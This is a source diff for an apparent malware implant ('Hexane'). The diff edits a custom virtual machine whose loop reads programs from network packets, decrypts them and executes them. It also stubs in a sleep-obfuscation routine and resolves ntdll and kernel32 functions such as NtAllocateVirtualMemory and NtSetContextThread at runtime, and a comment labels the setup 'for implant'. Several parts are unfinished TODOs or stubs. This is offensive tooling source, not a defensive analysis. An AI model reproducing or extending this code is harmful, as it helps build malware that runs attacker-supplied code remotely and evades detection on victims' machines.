@@ -5,8 +5,9 @@
 #include "mock.hpp"
 #include "vreg.hpp"
 
-#define HEXANE __hexane *ctx = __context;
-__data __hexane __context;
+#define HEXANE __hexane *ctx = (__hexane*)&__context;
+
+__data __hexane __context = { };
 __rdata const uintptr_t __handler[256];
 
 typedef struct {
@@ -31,9 +32,9 @@ __used register uintptr_t m_modbase asm(REG_MODBASE);
 __used register uintptr_t m_dkey    asm(REG_DKEY);
 __used register uintptr_t m_program asm(REG_PROGRAM); 
 
-__used register uint8_t m_vstack[VSTACK_MAX_CAPACITY]     asm(REG_VSTACK);
-__used register uint8_t m_vscratch[VSCRATCH_MAX_CAPACITY] asm(REG_VSCRATCH);
-__used register uint8_t m_vregs[VREGS_MAX_CAPACITY]       asm(REG_VREGS);
+__used register uint8_t m_vstack[VSTACK_MAX_CAPACITY]       asm(REG_VSTACK);
+__used register uintptr_t m_vscratch[VSCRATCH_MAX_CAPACITY] asm(REG_VSCRATCH);
+__used register uintptr_t m_vregs[VREGS_MAX_CAPACITY]       asm(REG_VREGS);
 #pragma endregion // VMCS_POINTERS
 
 #pragma region VM_STATE_FIELDS
@@ -52,13 +53,13 @@ __data CONTEXT host_context;
 
 #pragma region VM_FUNCTIONS
 __function void vm_init(vmcs_t *vmcs);
+__function void vm_finish(vmcs_t *vmcs);
 __function void vm_init_memory(void);
-__function void vm_finish(void);
 
-__function void save_host_context(vmcs_t *vmcs);
-__function void restore_host_context(vmcs_t *vmcs);
-__function void save_vm_context(vmcs_t *vmcs);
-__function void restore_vm_context(vmcs_t *vmcs);
+__function void save_host_context(void);
+__function void restore_host_context(void);
+__function void save_vm_context(void);
+__function void restore_vm_context(void);
 
 __extern __function uintptr_t vm_decode(uintptr_t address);
 __function void vm_decrypt(void);
@@ -67,6 +68,10 @@ __function void vm_stkchk(uintptr_t sp);
 __function void vm_set_load_rsv(uintptr_t address);
 __function void vm_clear_load_rsv(void);
 __function bool vm_check_load_rsv(uintptr_t address) const;
+
+__function void sleep_obf() {
+	return;
+}
 #pragma endregion // VM_FUNCTIONS
 
 namespace vm {
@@ -77,11 +82,9 @@ namespace vm {
 
 			vm_init(&vmcs); 
 			while(!m_halt) { 
-
 				sleep_obf();  // TODO:
 
-				// TODO: manual mapping probably needs to be done here.
-				if (!network::read_program_from_packet(m_program)) { // TODO:
+				if (!read_program_from_packet(m_program)) { // TODO:
 					continue; 
 				}
 				vm_entry(&vmcs); 
@@ -140,14 +143,17 @@ namespace vm {
 		__function void vm_init_memory(void) {
 			HEXANE;
 
+			// NOTE: first to run. allocate process space. todo: size checks
 			m_program_size = PROCESS_MAX_CAPACITY;
 			m_load_rsv_valid = false;
 			m_load_rsv_addr = 0LL;
 
+			// NOTE: mock context init for implant
 			ctx->win32.NtGetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetContextThread");
 			ctx->win32.NtSetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetContextThread");
 			ctx->win32.NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
 			ctx->win32.NtFreeVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtFreeVirtualMemory");
+			ctx->win32.NtGetFileSize = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetFileSize");
 			ctx->win32.NtReadFile = GetProcAddress(GetModuleHandle("kernel32.dll"), "ReadFile");
 			ctx->win32.NtOpenFile = GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenFile");
 
